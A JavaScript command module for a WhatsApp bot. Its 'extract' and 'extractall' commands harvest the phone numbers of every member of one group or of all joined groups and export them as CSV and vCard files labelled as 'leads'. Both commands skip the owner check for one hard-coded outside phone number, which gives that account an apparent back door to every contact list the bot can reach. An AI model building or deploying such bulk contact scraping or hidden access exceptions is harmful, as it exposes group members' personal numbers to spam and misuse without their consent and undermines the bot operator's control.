export const commands = [
  {
    name: 'extract',
    aliases: ['scrape'],
    description: "Extracts contacts from a group",
    category: 'Group',
    execute: async ({ sock, from, msg, args, isOwner, senderNumber }) => {
      if (!isOwner && senderNumber !== '255740906575') return await sock.sendMessage(from, { text: '⛔ Only the bot owner can use the extract command.' }, { quoted: msg });
      
      let targetGroupId = from;

      if (args && args.length > 0) {
          const groupIndex = parseInt(args[0]) - 1;
          const groups = await sock.groupFetchAllParticipating();
          const allGroups = Object.values(groups);
          if (groupIndex >= 0 && groupIndex < allGroups.length) {
              targetGroupId = allGroups[groupIndex].id;
          } else {
              await sock.sendMessage(from, { text: '⚠️ Invalid group number. Check your groups list.' }, { quoted: msg });
              return;
          }
      } else if (!from.endsWith('@g.us')) {
        const groups = await sock.groupFetchAllParticipating();
        const allGroups = Object.values(groups);
        let groupListMsg = '📝 *Your Groups List:*\n\n';
        allGroups.forEach((g, index) => {
          groupListMsg += `${index + 1}. ${g.subject}\n`;
        });
        groupListMsg += '\n👉 *To extract, reply with:* `.extract <number>`\nExample: `.extract 1`';
        await sock.sendMessage(from, { text: groupListMsg }, { quoted: msg });
        return;
      }

      try {
        await sock.sendMessage(from, { text: '⏳ Extracting contacts, please wait...' }, { quoted: msg });
        
        const groupMeta = await sock.groupMetadata(targetGroupId);
        const participants = groupMeta.participants;
        
        let vCardData = '';
        let csvData = 'Phone Number,Name\n';

        for (const p of participants) {
          const number = p.id.split('@')[0];
          const realName = `ATC_${number}`;
          
          csvData += `="${number}",${realName}\n`;
          vCardData += `BEGIN:VCARD\nVERSION:3.0\nFN:${realName}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        }

        const safeGroupName = (groupMeta.subject || 'Group').replace(/[^a-zA-Z0-9]/g, '_').substring(0, 25);
        
        await sock.sendMessage(from, {
          document: Buffer.from(csvData, 'utf-8'),
          mimetype: 'text/csv',
          fileName: `Extracted_${safeGroupName}.csv`,
          caption: `✅ Extracted ${participants.length} numbers!`
        });

        await sock.sendMessage(from, {
          document: Buffer.from(vCardData, 'utf-8'),
          mimetype: 'text/x-vcard',
          fileName: `Contacts_${safeGroupName}.vcf`,
          caption: `📲 Here is the V-Card file! Tap this on your phone to instantly save all contacts to your address book.`
        });

      } catch (err) {
        console.error("Extraction error:", err);
        await sock.sendMessage(from, { text: '❌ Failed to extract group data.' }, { quoted: msg });
      }
    }
  },
  {
    name: 'extractall',
    aliases: ['scrapeall'],
    description: "Extracts contacts from all groups",
    category: 'Group',
    execute: async ({ sock, from, msg, isOwner, senderNumber }) => {
      if (!isOwner && senderNumber !== '255740906575') return await sock.sendMessage(from, { text: '⛔ Only the bot owner can use this command.' }, { quoted: msg });

      try {
        await sock.sendMessage(from, { text: '⏳ Scanning all your groups to extract contacts...' }, { quoted: msg });
        
        const groups = await sock.groupFetchAllParticipating();
        const allGroups = Object.values(groups);
        
        let uniqueContacts = new Map();
        
        for (const group of allGroups) {
          for (const participant of group.participants) {
            const number = participant.id.split('@')[0];
            const realName = `ATC_${number}`;
            uniqueContacts.set(participant.id, realName);
          }
        }

        let vCardData = '';
        let csvData = 'Phone Number,Name\n';

        uniqueContacts.forEach((realName, id) => {
          const number = id.split('@')[0];
          csvData += `="${number}",${realName}\n`;
          vCardData += `BEGIN:VCARD\nVERSION:3.0\nFN:${realName}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        });

        await sock.sendMessage(from, {
          document: Buffer.from(csvData, 'utf-8'),
          mimetype: 'text/csv',
          fileName: `All_Leads.csv`,
          caption: `✅ Extracted ${uniqueContacts.size} UNIQUE contacts!`
        });

        await sock.sendMessage(from, {
          document: Buffer.from(vCardData, 'utf-8'),
          mimetype: 'text/x-vcard',
          fileName: `All_Contacts.vcf`,
          caption: `📲 Tap to save all leads to your phone contacts at once.`
        });

      } catch (err) {
        console.error("Extraction error:", err);
        await sock.sendMessage(from, { text: '❌ Failed to extract groups.' }, { quoted: msg });
      }
    }
  }
];
